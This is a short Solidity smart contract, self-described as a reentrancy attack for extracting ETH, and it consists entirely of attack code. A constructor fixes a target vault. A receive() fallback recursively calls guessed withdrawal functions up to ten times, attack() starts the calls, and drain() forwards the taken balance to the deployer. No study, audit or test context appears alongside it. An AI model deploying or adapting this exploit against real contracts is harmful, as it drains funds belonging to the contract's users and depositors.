// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReentrancyAttack
 * @notice Reentrancy attack contract for ETH extraction
 * @dev Attempts to drain ETH through recursive calls
 */
contract ReentrancyAttack {
    address payable public vault;
    address payable public owner;
    uint256 public attackCount;
    
    constructor(address payable _vault) {
        vault = _vault;
        owner = payable(msg.sender);
    }
    
    receive() external payable {
        if (attackCount < 10 && address(vault).balance > 0) {
            attackCount++;
            // Try various withdrawal patterns
            (bool s1,) = vault.call(abi.encodeWithSignature("withdraw()"));
            (bool s2,) = vault.call(abi.encodeWithSignature("withdrawETH()"));
            (bool s3,) = vault.call(abi.encodeWithSignature("emergencyWithdraw()"));
            (bool s4,) = vault.call(abi.encodeWithSignature("withdrawAll()"));
        }
    }
    
    function attack() external {
        attackCount = 0;
        // Try multiple attack vectors
        (bool s1,) = vault.call{value: 0}(abi.encodeWithSignature("withdraw()"));
        (bool s2,) = vault.call{value: 0}(abi.encodeWithSignature("execute(address,uint256,bytes)", address(this), 0, ""));
        (bool s3,) = vault.call{value: 0}("");
    }
    
    function drain() external {
        owner.transfer(address(this).balance);
    }
}
